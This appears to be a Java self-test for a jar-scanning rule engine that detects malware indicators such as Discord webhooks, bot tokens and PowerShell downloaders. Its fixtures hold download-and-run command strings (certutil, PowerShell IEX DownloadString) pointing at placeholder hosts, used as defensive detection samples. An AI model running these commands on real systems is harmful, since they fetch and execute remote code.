import com.jaranalyzer.scanners.*;
import com.jaranalyzer.scanners.engine.*;
import com.jaranalyzer.scanners.engine.rules.*;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.jar.*;
import org.objectweb.asm.*;

/**
 * Self-test del motore a regole IOC (stile progetto, zero dipendenze di test):
 * classi generate con ASM + jar sintetici, positivi e negativi per regola.
 * Esecuzione: scripts/run-selftests.bat (o javac + java -cp ... RuleEngineSelfTest).
 */
public class RuleEngineSelfTest {
  static int fails = 0;
  static void check(String n, boolean ok) {
    System.out.println((ok ? "OK   " : "FAIL ") + n);
    if (!ok) fails++;
  }
  static Path tmp;

  public static void main(String[] a) throws Exception {
    tmp = Files.createTempDirectory("ioc-test");
    check("regole caricate da JSON (>=9, non fallback)", RuleLoader.load().size() >= 9);
    IocRuleAnalyzer analyzer = new IocRuleAnalyzer();

    // 1-4: positivi, uno per regola (LDC in classi generate)
    check("discord-webhook scatta su LDC", hasRule(analyzer,
        jarWithClass("A", webhook()), "discord-webhook"));
    check("campione redatto, segreto mai in chiaro", redacted(analyzer,
        jarWithClass("B", webhook()), "discord-webhook"));
    check("telegram-bot-token scatta", hasRule(analyzer,
        jarWithClass("C", "12345678:" + "B".repeat(35)), "telegram-bot-token"));
    check("powershell-encoded scatta", hasRule(analyzer,
        jarWithClass("D", "powershell.exe -enc SQBmACgAJwBoAGkAJwApAA=="), "powershell-encoded"));
    check("paste-raw-endpoint scatta", hasRule(analyzer,
        jarWithClass("E", "https://pastebin.com/raw/AbCdEf12"), "paste-raw-endpoint"));
    check("lolbin-download scatta", hasRule(analyzer,
        jarWithClass("F", "certutil -urlcache -split -f http://x/y.exe"), "lolbin-download"));
    check("discord-token-mfa scatta", hasRule(analyzer,
        jarWithClass("G", "mfa." + "c".repeat(84)), "discord-token-mfa"));
    check("base64-blob scatta solo con magia eseguibile", hasRule(analyzer,
        jarWithClass("H", blobWithMagic()), "base64-blob"));
    check("base64 lungo senza magia NON scatta", !hasRule(analyzer,
        jarWithClass("I", blobWithoutMagic()), "base64-blob"));

    // 5-7: negativi (il motore a regole non fa cheat-matching)
    check("matrix/sendPacket/shack NON scattano", analyzer.analyze(
        jarWithClass("J", "matrix sendPacket shack")).isEmpty());
    check("token corto NON scatta", analyzer.analyze(
        jarWithClass("K", "123:abc")).isEmpty());

    // 6: metadati mai scansionati (FP del report: updateJSONURL, discord, versioni)
    Path meta = tmp.resolve("meta.jar");
    try (JarOutputStream j = new JarOutputStream(Files.newOutputStream(meta))) {
      addText(j, "README.md", "docs at https://cdn.discordapp.com/x.png and raw.githubusercontent.com/u/r");
      addText(j, "fabric.mod.json", "{\"version\":\"2.5.1.3\",\"contact\":{\"homepage\":\"https://github.com/x\"}}");
      addText(j, "a/b/mods.toml", "updateJSONURL=\"https://raw.githubusercontent.com/u/r/update.json\"");
      addText(j, "LICENSE.txt", "pastebin.com/raw/AbCdEf12 mfa." + "c".repeat(84));
      j.putNextEntry(new JarEntry("C.class"));
      j.write(minimalClass("C"));
      j.closeEntry();
    }
    check("metadati (README/mods.toml/fabric) NON scattano", analyzer.analyze(meta.toFile()).isEmpty());

    // 9: risorsa script scansionata
    Path ps = tmp.resolve("ps.jar");
    try (JarOutputStream j = new JarOutputStream(Files.newOutputStream(ps))) {
      addText(j, "run.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://x/y')");
    }
    check("risorsa .ps1 scansionata", hasRule(analyzer, ps.toFile(), "powershell-suspicious"));

    System.out.println(fails == 0 ? "RULE-ENGINE-SELFTEST PASS" : "RULE-ENGINE-SELFTEST FAIL(" + fails + ")");
    if (fails != 0) System.exit(1);
  }

  static String webhook() {
    return "https://discord.com/api/webhooks/" + "1".repeat(18) + "/" + "a".repeat(68);
  }

  static String blobWithMagic() {
    byte[] raw = new byte[160];
    raw[0] = 0x4D; raw[1] = 0x5A; // MZ
    return Base64.getEncoder().encodeToString(raw);
  }

  static String blobWithoutMagic() {
    return Base64.getEncoder().encodeToString(new byte[160]);
  }

  static boolean hasRule(IocRuleAnalyzer an, File jar, String rule) throws Exception {
    for (Finding f : an.analyze(jar)) {
      if (rule.equals(f.getRuleName())) return true;
    }
    return false;
  }

  static boolean redacted(IocRuleAnalyzer an, File jar, String rule) throws Exception {
    for (Finding f : an.analyze(jar)) {
      if (rule.equals(f.getRuleName())) {
        String ev = f.getEvidence() == null ? "" : f.getEvidence();
        return ev.contains("<redacted") && !ev.contains("a".repeat(68));
      }
    }
    return false;
  }

  static File jarWithClass(String cls, String ldc) throws Exception {
    Path p = tmp.resolve(cls + ".jar");
    try (JarOutputStream j = new JarOutputStream(Files.newOutputStream(p))) {
      j.putNextEntry(new JarEntry(cls + ".class"));
      j.write(classWithLdc(cls, ldc));
      j.closeEntry();
    }
    return p.toFile();
  }

  static byte[] classWithLdc(String cls, String ldc) {
    ClassWriter cw = new ClassWriter(0);
    cw.visit(Opcodes.V17, Opcodes.ACC_PUBLIC, cls, null, "java/lang/Object", null);
    MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC | Opcodes.ACC_STATIC,
        "get", "()Ljava/lang/String;", null, null);
    mv.visitCode();
    mv.visitLdcInsn(ldc);
    mv.visitInsn(Opcodes.ARETURN);
    mv.visitMaxs(1, 0);
    mv.visitEnd();
    cw.visitEnd();
    return cw.toByteArray();
  }

  static byte[] minimalClass(String cls) {
    ClassWriter cw = new ClassWriter(0);
    cw.visit(Opcodes.V17, Opcodes.ACC_PUBLIC, cls, null, "java/lang/Object", null);
    cw.visitEnd();
    return cw.toByteArray();
  }

  static void addText(JarOutputStream j, String name, String text) throws Exception {
    j.putNextEntry(new JarEntry(name));
    j.write(text.getBytes(StandardCharsets.UTF_8));
    j.closeEntry();
  }
}
